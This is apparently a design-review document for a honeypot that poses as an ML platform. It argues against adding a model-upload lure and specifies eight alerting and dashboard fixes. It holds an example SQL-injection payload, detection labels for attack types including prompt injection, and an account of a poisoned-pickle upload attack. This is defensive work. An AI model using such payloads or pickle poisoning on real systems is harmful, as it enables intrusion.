1. **Same capture mechanism, same event type**: Both endpoints would call `asyncio.to_thread(save_path.write_bytes, content)` and emit `http.upload.malware_received`. The file format (`.pkl` vs `.sh`) does not change what we capture or how we alert. No new sensor type, no new kill-chain branch, no new telemetry field is unlocked.

2. **The `/models` page has no upload affordance today**: `models.html` only shows a table of deployed models with a "Download weights" button. Adding an upload button requires a non-trivial frontend change to a page that already passes the deception vocabulary grep. Adding a file input form, drag-and-drop zone, or modal to `models.html` without it feeling bolted-on requires a full redesign of that page's top-right action area — frontend work that may introduce new deception tells.

3. **Duplication creates a consistency burden**: Two upload endpoints with different cover stories (`init script` vs `model file`) must stay coherent across the fake metrics in `/api/v1/metrics` (Prometheus endpoint at main.py:1194), the `FAKE_JOBS` response, the `FAKE_MODELS` response, and the Cowrie honeyfs. If a Round 31 gatekeeper audit finds that the `/jobs/new` page references `script-upload` but the `/models` page also accepts uploads with no cross-reference between them, the lack of internal cross-linking becomes a staged-data tell. One coherent surface is harder to fingerprint than two parallel ones.

**What about the attack narrative specifically?**

The strongest argument for a model upload endpoint is narrative specificity: an attacker who believes they are inside a real ML platform would think "if I can upload a poisoned `.pkl`, the inference server will deserialize it and execute my payload." This is genuinely more ML-domain-specific than "I uploaded a bash init script." However, this narrative advantage only matters to a sophisticated attacker who: (a) has ML-specific knowledge, and (b) does not stop at the init-script upload because they find it insufficient. In practice, a generic red teamer hitting an unknown target will submit whatever file upload endpoint they find first. The init-script endpoint is already on the most-visited page (`/jobs/new`), discoverable via the sidebar, and is session-gated so it appears legit. A model upload on the `/models` page is deeper in the navigation and less likely to be found by the typical scanner-first attacker this system is designed to capture.

### Verdict

The existing `script-upload` endpoint is sufficient. The model poisoning concept is architecturally sound and threat-realistic, but adding a second upload endpoint creates duplicate capture infrastructure for no new intelligence output. If the platform narrative later evolves to include an explicit model registry with a "Register External Model" workflow (e.g., as part of a `/pipelines` or `/models/import` page), a model upload endpoint could be added then as part of a larger cohesive feature, not as a standalone addition.

**If the gatekeeper disagrees and approves this feature**, the minimal correct implementation is:

- Route: `POST /api/v1/models/register` (not `/upload` — "register" is the MLOps vocabulary word; "upload" sounds like a file host)
- Accepted extensions: `.pkl`, `.pt`, `.onnx`, `.bin`, `.safetensors` — validate via both extension and content sniff (first 4 bytes); reject anything that doesn't match to avoid generic file-drop abuse
- Response: `{"model_id": "mdl-<hex8>", "status": "validation_queued", "message": "Model checkpoint accepted. Running safety scan on neuro-train-01 before registry promotion."}`
- Event type: reuse `http.upload.malware_received` with `"file_category": "model_checkpoint"` in payload — do NOT introduce a new event type (`http.upload.model_poisoning_received` is defender vocabulary)
- Add to `_LURE_PATHS` and `_NO_COOLDOWN_EVENTS`
- Frontend: add a single "Register Model" button on `models.html` that opens a file picker restricted to `.pkl,.pt,.onnx,.bin,.safetensors` — no full form redesign needed, just a top-right action button consistent with the page's current "Download weights" affordance
- MIME-type sniff to capture `.pkl` magic bytes (`\x80\x05`) in payload for forensic value
- Same disk-fill risk as `script-upload` — the 50MB cap and `UPLOAD_DIR` volume must be shared or independently bounded

---

## Session 9 — Sentinel & Dashboard Coverage Fixes (Pending Gatekeeper Review)

Eight targeted gaps identified by coverage audit. No new sensors or routes. All changes are confined to `sentinel.py`, `log_shipper.py`, and `main.py`.

---

### FIX-A (Critical): Telemetry beacons saturate the shared "http" cooldown bucket — IMPLEMENTED ✓

**Problem.** Every `metrics.js` page-load fires between 5 and 10 telemetry POSTs per session: page_view, field_interaction, canvas/WebRTC beacons, dwell-time on pagehide. Each resolves to event_type `http.post.api.v1.telemetry` or `http.get.api.v1.telemetry`. Both fall into the generic `"http"` cooldown category inside `_should_alert()` (line 268 of `sentinel.py`: `elif event_type.startswith("http."): cooldown_category = "http"`). The first telemetry beacon from an IP sets the 60-second cooldown. Any SQLi, SSRF, DevTools, or lure-credential event that fires within that 60-second window is silently suppressed — `_suppressed(src_ip, "http")` returns True and `send_alert()` is never called. This is the highest-severity silent-alert failure in the current system.

**File:** `deploy/module-5-log-shipper/src/sentinel.py`

**Change 1 — Add telemetry event types to `_NOISE_EVENTS` (line 68–70).**

Current `_NOISE_EVENTS` (lines 68–70):
```python
_NOISE_EVENTS = {"http.get.health", "cowrie.session.closed", "api.startup",
                 "cowrie.session.connect", "smtp.session.connect", "smtp.ehlo",
                 "smb.server.started"}
```

Replace with:
```python
_NOISE_EVENTS = {"http.get.health", "cowrie.session.closed", "api.startup",
                 "cowrie.session.connect", "smtp.session.connect", "smtp.ehlo",
                 "smb.server.started",
                 "http.post.api.v1.telemetry",   # metrics.js beacons — not attacker actions
                 "http.get.api.v1.telemetry"}     # same, GET variant
```

**Change 2 — Add `http.telemetry.devtools_opened` to `_NO_COOLDOWN_EVENTS` (lines 73–82).**

DevTools detection beacons fired by `metrics.js` use event_type `http.post.api.v1.telemetry` with `payload.type = "devtools_panel_open"` or `"dev_tools_key"`. Once the parent event type is in `_NOISE_EVENTS`, these are suppressed at the noise filter before `_build_reason()` runs. The devtools signal is high-value (human attacker confirmation) — it must not be silenced.

Two-step fix: (a) `metrics.js` should send devtools events as a distinct event_type `http.telemetry.devtools_opened` rather than the generic telemetry path; (b) sentinel adds that type to `_NO_COOLDOWN_EVENTS`.

For the sentinel side, add to `_NO_COOLDOWN_EVENTS` (after line 81):
```python
    "http.telemetry.devtools_opened",  # human attacker: F12/side-panel — always alert
```

Note: the `main.py` middleware derives `event_type` from the URL path as `f"http.{method.lower()}.{path_cat}"`. The telemetry endpoint is at `/api/v1/telemetry` so all beacons produce `http.post.api.v1.telemetry` regardless of the `type` field in the body. To emit the distinct `http.telemetry.devtools_opened` type, the `/api/v1/telemetry` handler in `main.py` must inspect `body.type` and, when it equals `"devtools_panel_open"` or `"dev_tools_key"`, call `_log_event()` directly with `event_type = "http.telemetry.devtools_opened"` before the middleware logs it as the generic type. The middleware log is acceptable to leave as noise; the explicit `_log_event()` call produces the actionable record. This requires a matching change to `main.py` (see Change 3 below).

**Change 3 — `main.py`: distinguish devtools beacons from generic telemetry.**

File: `deploy/module-6-honeypot-api/src/main.py`

Locate the telemetry endpoint (currently a thin handler that returns `{"ok": True}`). Add body inspection before the return:

```python
# After reading body_json from request:
beacon_type = body_json.get("type", "")
if beacon_type in ("devtools_panel_open", "dev_tools_key"):
    _log_event({
        "event_id": str(uuid.uuid4()),
        "created_at": datetime.now(timezone.utc),
        "sensor": "api",
        "event_type": "http.telemetry.devtools_opened",
        "src_ip": src_ip,
        "src_port": request.client.port if request.client else None,
        "dst_port": 8080,
        "username": None,
        "password": None,
        "payload": json.dumps({"beacon_type": beacon_type, "key": body_json.get("key")}),
        "raw_log": None,
        "session_id": request.cookies.get("nro_session") or str(uuid.uuid4()),
        **_lookup_geo(src_ip),
    })
```

Also add a `_build_reason()` branch in `sentinel.py` for `http.telemetry.devtools_opened` (insert after the `http.prompt.injection` branch at line 116):
```python
if event_type == "http.telemetry.devtools_opened":
    key = payload.get("key") or ""
    return f"DevTools opened — key={key or 'side-panel'} — POSSIBLE HUMAN ATTACKER"
```

And a `_build_message()` header branch (after the `http.prompt.injection` header at line 324):
```python
elif event_type == "http.telemetry.devtools_opened":
    header = "👁️ <b>DEVTOOLS OPENED — HUMAN ATTACKER SIGNAL</b>"
```

**Expected result after fix.** Telemetry beacon floods no longer consume the `"http"` cooldown bucket. A scanner that triggers SQLi on the same request as a telemetry beacon will still fire the SQLi alert. DevTools events continue to alert immediately, bypassing all cooldown suppression.

---

### FIX-B (Medium): security.* events produce bare event_type strings in Telegram — IMPLEMENTED ✓

**Problem.** `security.mfa_toggle_attempt`, `security.session_revoke_attempt`, `security.allowlist_probe`, `security.key_rotation_attempt`, and `security.audit_log_viewed` all pass `_NOISE_EVENTS` and reach `send_alert()`. However `_build_reason()` has no branch for `security.*` event types — they fall through to the final `return event_type` at line 201. The Telegram alert body reads `"Reason: security.mfa_toggle_attempt"` with no attacker-captured data. For MFA toggle specifically, the submitted password (`row["password"]`) — the highest-value field — is never shown.

Additionally, all five event types currently assign `cooldown_category = event_type` (they don't start with `http.`, aren't in `_SNARE_CATEGORIES`, and aren't `cowrie.login.failed`). This means each fires independently per IP, which is correct behaviour. However, they are not grouped into a shared `"web.security"` bucket — if an attacker spams all five endpoints from the same IP, they can generate 5 separate cooldown windows independently. Adding them to `_SNARE_CATEGORIES` with `"web.security"` normalises this.

**File:** `deploy/module-5-log-shipper/src/sentinel.py`

**Change 1 — Add `security.*` branch to `_build_reason()` (insert before the final fallback at line 200).**

```python
if event_type.startswith("security."):
    action_map = {
        "security.mfa_toggle_attempt":    "MFA disable attempt",
        "security.session_revoke_attempt": "Session revocation attempt",
        "security.allowlist_probe":        "IP allowlist submission",
        "security.key_rotation_attempt":   "API key rotation triggered",
        "security.audit_log_viewed":       "Audit log accessed",
    }
    action = action_map.get(event_type, event_type)
    cidr = payload.get("cidr") or ""
    label = payload.get("label") or ""
    action_rotate = payload.get("action") or ""
    pw_fragment = f" | password={'*' * min(len(password), 3)}{password[-2:] if len(password) >= 2 else ''}" if password else ""
    extra = ""
    if cidr:
        extra = f" | cidr={cidr}"
    elif label:
        extra = f" | label={label}"
    elif action_rotate:
        extra = f" | action={action_rotate}"
    return f"{action}{pw_fragment}{extra} — path={path or event_type}"
```

**Change 2 — Add entries to `_SNARE_CATEGORIES` (inside the dict at lines 243–265, after the existing `"http.bruteforce.detected"` entry at line 255).**

```python
        "security.mfa_toggle_attempt":    "web.security",
        "security.session_revoke_attempt": "web.security",
        "security.allowlist_probe":        "web.security",
        "security.key_rotation_attempt":   "web.security",
        "security.audit_log_viewed":       "web.security",
```

**Change 3 — Add a `_build_message()` header for security events (insert after the `smb.` fallback at line 342).**

```python
elif event_type.startswith("security."):
    header = "🔐 <b>SECURITY PAGE ACTION</b>"
```

**Expected result after fix.** A Telegram alert for `security.mfa_toggle_attempt` will show `"Reason: MFA disable attempt | password=Ne*ro — path=/api/v1/security/mfa/toggle"` instead of the bare event_type. All five security event types share the `"web.security"` cooldown bucket per IP, so repeated probing of multiple security endpoints from the same IP fires one alert per 60-second window rather than five independent ones.

---

### FIX-C (Medium): Forgot-password email not captured in username column — IMPLEMENTED ✓

**Problem.** `POST /auth/forgot-password` (handler `forgot_password()` at line 1799 of `main.py`) reads no body — it immediately calls `_jitter()` and returns the JSON success message. The submitted email address is never extracted and never written to `honeypot_events.username`. The middleware does log an `http.post.auth.forgot-password` event, but `username` is NULL because `/auth/forgot-password` is not in `_LOGIN_PATHS` (line 205: `_LOGIN_PATHS = {"/api/v1/auth", "/admin/login", "/auth/login"}`), so the middleware's login-body extraction block (lines 543–560) is skipped.

The email field is the primary attacker-identifying artifact from this endpoint. An attacker using their own email for password recovery is an attribution opportunity that the current code silently discards.

**File:** `deploy/module-6-honeypot-api/src/main.py`

**Option A (preferred) — Explicit `_log_event()` call inside `forgot_password()`.**

Replace the current handler body (lines 1799–1805):

```python
# BEFORE:
async def forgot_password(request: Request):
    """Captures attacker email — always returns fake success."""
    await _jitter()
    return JSONResponse(content={
        "message": "If that email is registered, you'll receive a link within 5 minutes. "
                   "Check #ai-infra on Slack.",
    })
```

```python
# AFTER:
async def forgot_password(request: Request):
    """Captures attacker email — always returns fake success."""
    await _jitter()
    src_ip = _extract_src_ip(request)
    submitted_email: str | None = None
    try:
        body = await request.json()
        submitted_email = str(body.get("email") or body.get("username") or "")[:256] or None
    except Exception:
        pass
    if submitted_email:
        _log_event({
            "event_id": str(uuid.uuid4()),
            "created_at": datetime.now(timezone.utc),
            "sensor": "api",
            "event_type": "http.lure.forgot_password",
            "src_ip": src_ip,
            "src_port": request.client.port if request.client else None,
            "dst_port": 8080,
            "username": submitted_email,
            "password": None,
            "payload": json.dumps({"submitted_email": submitted_email, "path": "/auth/forgot-password"}),
            "raw_log": None,
            "session_id": request.cookies.get("nro_session") or str(uuid.uuid4()),
            **_lookup_geo(src_ip),
        })
    return JSONResponse(content={
        "message": "If that email is registered, you'll receive a link within 5 minutes. "
                   "Check #ai-infra on Slack.",
    })
```

Using `event_type = "http.lure.forgot_password"` rather than the middleware-derived `http.post.auth.forgot-password` prevents the duplicate-event problem (middleware will still fire its generic event; the explicit call produces a distinct high-value record).

**Option B (alternative) — Add `/api/v1/auth/forgot-password` to `_LOGIN_PATHS` at line 205.**

This causes the middleware to extract `email`/`username` from the POST body automatically. It works only if the frontend POSTs to `/api/v1/auth/forgot-password` (the API path). The current route is at `/auth/forgot-password` (the UI path). If both paths are used by the template, both would need to be added. Option A is preferred because it also sets a distinct event_type, making the record easier to query and sentinel-match.

**Sentinel side — no change required.** `http.lure.forgot_password` will fall through `_build_reason()` to the `http.` fallback: `"Web probe: POST /auth/forgot-password (user=<email>)"` — the email appears in the `username` field shown at the bottom of the Telegram message body. If a more specific reason string is desired, add a branch to `_build_reason()`:
```python
if event_type == "http.lure.forgot_password":
    return f"Password reset requested for: {username or '(no email submitted)'}"
```

**Expected result after fix.** Every POST to `/auth/forgot-password` with a non-empty email body produces a `honeypot_events` row where `username = <submitted_email>`. The Telegram alert shows the submitted email. Sentinel's credential replay check (`_check_credential_replay()`) picks up the username for cross-sensor correlation.

---

### FIX-D (Medium): HoneyDash attack_type labels are auto-generated ugly strings — IMPLEMENTED ✓

**Problem.** In HoneyDash's `log_collector.py` at line 204: `attack_type = EVENTID_TO_ATTACK_TYPE.get(eid) or data.get("attack_type") or eid.replace(".", " ").title() or "Remote Honeypot Event"`. When `_push_honeydash_async()` is called with `attack_type="Lure Credential"`, that string is passed directly and HoneyDash stores it. But when the middleware-logged generic events flow through `log_shipper.py`'s `_add_to_honeydash_batch()` path (non-SNARE HTTP events), `attack_type` is not set in the event dict, so HoneyDash's fallback produces `eid.replace(".", " ").title()` — yielding labels like `"Http Post Api V1 Telemetry"`, `"Http Lure Credential Success"`, `"Security Mfa Toggle Attempt"`. These appear in the HoneyDash dashboard UI event table and session cards.

**File:** `deploy/module-5-log-shipper/src/log_shipper.py`

**Change — Add `_HD_ATTACK_TYPE` mapping dict above `_honeydash_event()` definition (line 1684), and apply it inside `_honeydash_event()`.**

Insert after the `_HD_SENSOR_NAME` block (after line 1674):
```python
# Clean attack_type labels for the HoneyDash event table.
# HoneyDash fallback is eid.replace(".", " ").title() which produces ugly strings.
# This dict is consulted first; unrecognised event types keep the fallback.
_HD_ATTACK_TYPE: dict[str, str] = {
    # SSH / Cowrie
    "cowrie.login.failed":          "SSH Brute Force",
    "cowrie.login.success":         "SSH Login",
    "cowrie.command.input":         "Command Execution",
    "cowrie.session.file_download": "Malware Download",
    "cowrie.session.connect":       "SSH Connect",
    # OpenCanary / MariaDB
    "opencanary.ftp.login":         "FTP Brute Force",
    "opencanary.telnet.login":      "Telnet Attack",
    "opencanary.redis.command":     "Redis Probe",
    "mariadb.connect":              "MySQL Brute Force",
    "mariadb.query":                "MySQL Query",
    # HTTP SNARE
    "http.sqli.attempt":            "SQL Injection",
    "http.post.sqli.attempt":       "SQL Injection",
    "http.lfi.attempt":             "LFI Attempt",
    "http.get.lfi.attempt":         "LFI Attempt",
    "http.rce.attempt":             "RCE Attempt",
    "http.post.rce.attempt":        "RCE Attempt",
    "http.cmdi.attempt":            "Command Injection",
    "http.xss.attempt":             "XSS Attempt",
    "http.get.xss.attempt":         "XSS Attempt",
    "http.snare.ssrf_attempt":      "SSRF Attempt",
    "http.bruteforce.detected":     "HTTP Brute Force",
    "http.prompt.injection":        "Prompt Injection",
    # Lure / canary
    "http.lure.credential.success": "Lure Credential Used",
    "http.lure.data_exfil":         "Data Exfiltration",
    "http.canarytoken.fired":       "Canarytoken Triggered",
    "http.upload.malware_received": "Malware Upload",
    "http.lure.forgot_password":    "Password Reset Probe",
    # Security page
    "security.mfa_toggle_attempt":     "MFA Disable Attempt",
    "security.session_revoke_attempt": "Session Revocation",
    "security.allowlist_probe":        "IP Allowlist Edit",
    "security.key_rotation_attempt":   "Key Rotation",
    "security.audit_log_viewed":       "Audit Log Access",
    # Cross-sensor
    "cross_sensor.credential_relay": "Credential Relay (SSH→DB)",
    # SMB
    "smb.ntlmv2.hash":    "NTLMv2 Hash Captured",
    "smb.auth.attempt":   "SMB Auth Attempt",
    "smb.enum.shares":    "SMB Share Enumeration",
    "smb.file.read":      "SMB File Read",
    "smb.file.write":     "SMB File Write",
    "smb.connect":        "SMB Connect",
}
```

Inside `_honeydash_event()`, after the sensor remap at line 1711:
```python
# Apply clean attack_type label if not already set by caller
if "attack_type" not in out or not out["attack_type"]:
    event_type = out.get("eventid") or out.get("_event_type") or ""
    out["attack_type"] = _HD_ATTACK_TYPE.get(event_type, event_type.replace(".", " ").title())
```

Note: events pushed via `_push_honeydash_async()` in `main.py` already set `attack_type` explicitly — those values take precedence because they arrive with `attack_type` set in the dict. This change only fills in the gap for events flowing through the `_add_to_honeydash_batch()` path from `log_shipper.py`.

**Expected result after fix.** HoneyDash event table shows `"SQL Injection"`, `"Lure Credential Used"`, `"MFA Disable Attempt"` instead of `"Http Post Sqli Attempt"`, `"Http Lure Credential Success"`, `"Security Mfa Toggle Attempt"`.

---

### FIX-E (Medium): command_input is NULL for HTTP SNARE events in HoneyDash — IMPLEMENTED ✓

**Problem.** HoneyDash's `log_collector.py` at line 282 populates `command_input = data.get("input") or data.get("command_input") or data.get("command")`. The field name it reads is `"input"`. In `_push_honeydash_async()` (line 1013 of `main.py`), the event dict is built with `"body_preview": payload_dict.get("body_preview")` — there is no `"input"` key. HoneyDash never sees the attack payload (the SQLi string, the RCE command, the SSRF URL) in `command_input`. This column is NULL for all HTTP SNARE events.

The `command_input` column is shown in the HoneyDash session detail view, the events table, and the reports CSV export. A NULL value there for `"SQL Injection"` attack_type is a visible data-quality gap.

**File:** `deploy/module-6-honeypot-api/src/main.py`

**Change — Add `"input"` field to the `honeydash_event` dict in `_push_honeydash_async()` for SNARE-category events.**

In `_push_honeydash_async()` (lines 992–1014), after building `honeydash_event`, add:

```python
# Populate HoneyDash command_input field for SNARE attack types.
# HoneyDash reads data.get("input") → Event.command_input column.
_SNARE_ATTACK_TYPES = {
    "RCE Attempt", "SQL Injection", "LFI Attempt",
    "Command Injection", "XSS Attempt", "SSRF Attempt",
    "Prompt Injection",
}
if attack_type in _SNARE_ATTACK_TYPES:
    honeydash_event["input"] = (
        payload_dict.get("body_preview")
        or payload_dict.get("query_params", {}).get("path")
        or payload_dict.get("path")
    )
```

Place this block between line 1013 (`"body_preview": payload_dict.get("body_preview"),`) and line 1016 (`async with httpx.AsyncClient...`). The `_SNARE_ATTACK_TYPES` set should be defined at module level (near `_SNARE_CATEGORIES`) rather than inside the async function to avoid re-creation on every call.

**Expected result after fix.** For a `"SQL Injection"` SNARE event where `body_preview = "' OR 1=1 --"`, HoneyDash stores `command_input = "' OR 1=1 --"`. The session detail view and reports CSV export show the attack payload. HoneyDash's full-text search (which includes `command_input`) now returns HTTP SNARE events when searching for payload strings.

---

### FIX-F (Minor): Non-SSRF webhook test hits generic "http" bucket — IMPLEMENTED ✓

**Problem.** `POST /api/v1/integrations/webhook/test` with a non-SSRF target URL (e.g., `https://hooks.slack.com/services/valid/slack/url`) logs `event_type = http.post.api.v1.integrations.webhook.test` and falls into the generic `"http"` cooldown category. This event is fired by an attacker legitimately exploring the Integrations page — they aren't triggering SSRF — but the event is indistinguishable from scanner noise in the cooldown logic. If they also trigger a legitimate telemetry beacon within the same 60-second window, the webhook-test event is suppressed.

**File:** `deploy/module-5-log-shipper/src/sentinel.py`

**Change — Add `"http.post.api.v1.integrations.webhook.test"` to `_SNARE_CATEGORIES` with a distinct `"web.webhook"` bucket (inside the `_SNARE_CATEGORIES` dict at lines 243–265).**

```python
        "http.post.api.v1.integrations.webhook.test": "web.webhook",
```

This gives the webhook-test event its own independent cooldown bucket per IP, separate from the generic `"http"` bucket. It will no longer be suppressed by prior telemetry beacons, and it won't suppress subsequent SQLi or lure-path alerts.

No `_build_reason()` change needed — the existing `http.` fallback produces `"Web probe: POST /api/v1/integrations/webhook/test"` which is adequately descriptive. The attacker's submitted URL is visible in `payload.webhook_url` which appears in the Telegram body as part of the full event payload dump.

**Expected result after fix.** A webhook-test event always fires its own Telegram alert (subject to its own 60-second per-IP `"web.webhook"` cooldown). Subsequent SQLi or lure-path events from the same IP within 60 seconds are not suppressed by this event.

---

### FIX-G (Minor): download_url NULL for lure file downloads in HoneyDash — IMPLEMENTED ✓

**Problem.** `http.lure.data_exfil` events are pushed via `_push_honeydash_async(event, "Data Exfil")` (line 647 of `main.py`). The `honeydash_event` dict built in `_push_honeydash_async()` at lines 992–1014 does not include a `"download_url"` or `"url"` key. HoneyDash's `log_collector.py` at line 283 reads `download_url = data.get("url") or data.get("download_url")`. Both keys are absent — `Event.download_url` is NULL for every lure file download.

The filename of the downloaded lure file is available in the `event["payload"]` JSON under the `"file"` key (set by `data_export_download()` in `main.py` via the `X-Lure-Data-Exfil` middleware path). It can also be recovered from the `"path"` query param extracted by the middleware.

**File:** `deploy/module-6-honeypot-api/src/main.py`

**Change — Populate `"download_url"` field in `_push_honeydash_async()` for `"Data Exfil"` attack_type.**

In `_push_honeydash_async()`, after building `honeydash_event` (at the same location as the FIX-E `"input"` addition, i.e., after line 1013), add:

```python
if attack_type == "Data Exfil":
    dl_file = (
        payload_dict.get("file")
        or payload_dict.get("query_params", {}).get("file")
        or payload_dict.get("path")
    )
    if dl_file:
        honeydash_event["download_url"] = f"/api/v1/data/exports/download?file={dl_file}"
```

The value is a relative URL path string — HoneyDash stores it as-is in `Event.download_url` (String column, no URL validation). It will be visible in the session detail view, the events table `download_url` column, and the reports CSV export.

**Expected result after fix.** A lure file download event in HoneyDash shows `download_url = "/api/v1/data/exports/download?file=workspace-export-2026-05-31.csv"` (or whichever filename was requested). HoneyDash's full-text search on `download_url` returns these events. The session malware tab (which filters on `download_url IS NOT NULL`) begins populating for HTTP lure downloads.

---

### FIX-H (Minor): NTLMv2 hash not visible in HoneyDash credential view — IMPLEMENTED ✓

**Problem.** In `SmbTailer._normalize()` at line 1218 of `log_shipper.py`, the `password` field is explicitly set to `None`: `"password": None, # NTLM hash goes in payload, never in password column`. The comment was correct as originally written — NTLMv2 hashes are not plaintext passwords and look wrong in a password field. However, HoneyDash's session credential view and session detail overlay query `Event.password` to display captured credentials. Because `password = None`, NTLMv2 hashes are invisible in every HoneyDash credential view even though they are the highest-value SMB capture artifact.

The NTLMv2 hash string is stored in `payload_fields["ntlmv2_hash"]` and reaches PostgreSQL's `payload` JSONB column correctly. It is visible in the Telegram alert via `_build_reason()` and in raw SQL queries. The gap is specifically the HoneyDash credential UI.

**File:** `deploy/module-5-log-shipper/src/log_shipper.py`

**Change — Populate `password` field with the NTLMv2 hash string for `smb.ntlmv2.hash` events in `SmbTailer._normalize()` (lines 1209–1226).**

Change line 1218 from:
```python
"password": None,    # NTLM hash goes in payload, never in password column
```
to:
```python
"password": raw.get("ntlmv2_hash") or None,   # NTLMv2: populate password col for HoneyDash cred view
```

Additionally, keep the hash in `payload_fields` (no removal) so it remains in the `payload` JSONB column for forensic queries and sentinel alerting. Both columns will contain the hash — this is intentional duplication for UI accessibility.

Update the inline comment at line 1201 to reflect the change:
```python
# ntlmv2_hash is stored in both payload (forensic) and password column (HoneyDash cred view)
```

**Expected result after fix.** HoneyDash session detail view for SMB sessions shows the NTLMv2 hash in the credentials field alongside the username and domain. The hash remains in `payload` JSONB for sentinel's `_build_reason()` path (which reads `payload.ntlmv2_hash` directly) — no sentinel change required.
